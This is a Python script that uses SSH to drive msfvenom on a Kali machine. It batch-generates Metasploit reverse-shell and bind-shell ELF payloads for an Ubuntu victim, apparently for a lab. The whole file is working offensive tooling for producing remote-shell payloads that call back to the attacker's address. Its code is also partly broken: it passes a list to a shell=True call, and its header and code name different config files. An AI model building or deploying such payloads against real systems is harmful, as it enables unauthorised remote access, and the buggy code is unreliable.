# Program is responsible for generating Metasploit payloads on attacker machine (Kali)
# Program is developed on Windows 11 and Python 3.12.9
# Prerequisites:
#   Attacker machine: Kali
#   Victim machine: Ubuntu
#       Dependency: openssh-server (To use ssh & scp commands)
#   Add public key to both attacker(kali) and victim(ubuntu) machines to access via ssh from windows
#   Add both attacker and victim machine to windows known hosts
#   Execute: ssh-keygen -t rsa
#   Copy public key to victim: ssh-copy-id user@victim_ip
#   Copy public key to attacker: ssh-copy-id user@attacker_ip
#   Provide all configurations in pipeline_config.json file before executing the script
# Version: 1.0

import json
import os
import subprocess

current_dir = os.path.dirname(os.path.abspath(__file__))

def execute_system_command(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

def obtain_output_file_name(payload):
    if "/shell/" in payload or "/meterpreter/" in payload:
        stage_type = "staged"
    else:
        stage_type = "stageless"

    return payload.replace("/", "_") + "_" + stage_type

class MetasploitPayloadGeneration:

    def __init__(self):
        self.config = {}
        self.config_file = os.path.join(current_dir, "config.json")
        self.get_all_config_info()

    def get_all_config_info(self):
        with open(self.config_file, 'r') as cfg:
            self.config = json.load(cfg)

    def create_payload_directory(self):
        execute_system_command(["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", "mkdir", "-p", self.config["payload_dir"]]).strip().split("\n")

    def generate_all_payloads(self):
        for payload in self.config["payloads"]:
            file_name = obtain_output_file_name(payload)
            if "reverse" in payload:
                if "ipv6" in payload:
                    lhost = self.config["attacker_ipv6"]
                else:
                    lhost = self.config["attacker_ip"]
                payload_gen_cmd = f"{self.config["msfvenom_path"]} -p {payload} LHOST={lhost} LPORT={self.config["attacker_port"]} -f elf -o {self.config["payload_dir"]}/{file_name}"
            elif "bind" in payload:
                if "ipv6" in payload:
                    rhost = self.config["victim_ipv6"]
                else:
                    rhost = self.config["victim_ip"]
                payload_gen_cmd = f"{self.config["msfvenom_path"]} -p {payload} RHOST={rhost} LPORT={self.config["attacker_port"]} -f elf -o {self.config["payload_dir"]}/{file_name}"
                
            execute_system_command(["ssh", f"{self.config["attacker_user"]}@{self.config["attacker_ip"]}", payload_gen_cmd])
            print(f"{payload} generated successfully.")


if __name__ == "__main__":
    payload_obj = MetasploitPayloadGeneration()
    payload_obj.create_payload_directory()
    payload_obj.generate_all_payloads()
